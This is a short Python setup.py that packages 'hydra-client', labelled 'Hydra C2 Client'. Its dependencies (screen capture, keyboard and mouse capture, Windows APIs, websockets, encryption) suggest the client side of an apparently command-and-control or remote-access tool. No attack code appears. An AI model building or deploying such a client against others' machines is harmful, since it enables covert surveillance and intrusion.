from setuptools import setup, find_packages

setup(
    name="hydra-client",
    version="1.0.0",
    packages=find_packages(),
    install_requires=[
        'numpy',
        'pillow',
        'mss',
        'pynput',
        'pyautogui',
        'pywin32',
        'websockets',
        'cryptography'
    ],
    python_requires='>=3.7',
    author="Anonymous",
    description="Hydra C2 Client",
    entry_points={
        'console_scripts': [
            'hydra-client=hydra_client.main:run_main',
        ],
    },
) 